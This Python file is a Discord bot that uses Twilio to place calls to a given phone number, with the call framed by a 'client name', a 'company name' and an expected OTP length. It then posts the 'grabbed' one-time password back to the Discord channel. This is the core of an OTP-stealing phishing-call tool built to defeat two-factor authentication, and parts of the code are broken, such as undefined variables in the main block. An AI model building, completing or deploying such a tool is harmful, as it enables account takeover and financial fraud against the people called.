import interactions
from interactions import OptionType, slash_option
from interactions import SlashContext
from twilio.rest import Client
import asyncio
import os
import time
import json

# Load configuration
if not os.path.exists('Config.txt'):
    print("Config.txt not found. Please create the file with the necessary configuration.")
    exit()

with open('Config.txt', 'r') as f:
    raw_config = json.load(f)

# Twilio client setup
twilio_client = Client(raw_config['account_sid'], raw_config['auth_token'])

# Discord bot setup
intents = interactions.Intents.DEFAULT | interactions.Intents.MESSAGE_CONTENT
client = interactions.Client(token=raw_config['bot_token'], intents=intents)

# Ready event
@interactions.listen()
async def on_ready():
    print(f"We're online! Logged in as {client.app.name}.")
    print(f"Our latency is {float(client.latency)} ms.")

# Message creation event
@interactions.listen("on_message_create")
async def on_message_create(message_create: interactions.events.MessageCreate):
    message = message_create.message
    print(f"Message from {message.author.username}: {message.content}")

# Slash command for dialing
@interactions.slash_command(name="dial", description="Dial a phone number")
@interactions.slash_option(
    name="phone_number",
    description="The phone number to dial",
    required=True,
    opt_type=OptionType.STRING
)
@interactions.slash_option(
    name="otp_digits",
    description="Number of digits for the OTP",
    required=True,
    opt_type=OptionType.INTEGER
)
@interactions.slash_option(
    name="client_name",
    description="Name of the client",
    required=True,
    opt_type=OptionType.STRING
)
@interactions.slash_option(
    name="company_name",
    description="Name of the company",
    required=True,
    opt_type=OptionType.STRING
)
# ''''''''''''''''''''async def dial(ctx: SlashContext, phone_number: str, otp_digits: int, client_name: str, company_name: str):
#     # Twilio call logic here
#     print(f"Initiating call to {phone_number} for client {client_name} from {company_name} with OTP of {otp_digits} digits.")''''''''''''''''''''
async def dial(ctx: SlashContext, phone_number: str, otp_digits: int, client_name: str, company_name: str):
    # Write details to files
    os.makedirs('Details', exist_ok=True)
    with open('Details/Digits.txt', 'w') as f:
        f.write(f'{otp_digits}')
    with open('Details/Client_Name.txt', 'w') as f:
        f.write(f'{client_name}')
    with open('Details/Company Name.txt', 'w') as f:
        f.write(f'{company_name}')

    # Initiate the Twilio call
    call = twilio_client.calls.create(
        url=f'{raw_config["ngrok_url"]}/voice',
        to=phone_number,
        from_=raw_config['Twilio Phone Number']
    )
    sid = call.sid
    print(f"Call SID: {sid}")

    # Monitor the call status
    a = b = c = d = 0
    while True:
        call_status = twilio_client.calls(sid).fetch().status
        if call_status == 'queued' and a < 1:
            await ctx.send("Call Is Placed")
            a += 1
        elif call_status == 'ringing' and b < 1:
            await ctx.send("Cell Phone Is Ringing")
            b += 1
        elif call_status == 'in-progress' and c < 1:
            await ctx.send("Call In Progress")
            c += 1
        elif call_status == 'completed':
            await ctx.send("Call Successfully Completed")
            break
        elif call_status == 'failed':
            await ctx.send("Call Failed")
            break
        elif call_status == 'no-answer':
            await ctx.send("Call Was Not Answered")
            break
        elif call_status == 'canceled':
            await ctx.send("Call Was Canceled By The Client")
            break
        elif call_status == 'busy':
            await ctx.send("User Busy During This Call")
            break
        time.sleep(1)

async def process_otp(ctx, sid):
    # Proper file handling using 'with' statement
    with open('grabbed_otp.txt', 'r') as file:
        otp = file.read()

    call_info = twilio_client.calls(sid).fetch()

    # Respond based on the OTP status
    if otp == '':
        await ctx.send(f"Unable to Grab OTP\n\nPrice: {call_info.price}\nDuration: {call_info.duration} secs")
    else:
        await ctx.send(f"{otp}\n\nPrice: {call_info.price}\nDuration: {call_info.duration} secs")

    # Clear the contents of the file after reading
    with open('grabbed_otp.txt', 'w') as file:
        file.close()

# Starting the client and calling the asynchronous function
if __name__ == "__main__":
    client.start()

    # Assuming 'ctx' and 'sid' are defined and available here
    loop = asyncio.get_event_loop()
    loop.run_until_complete(process_otp(ctx, sid))
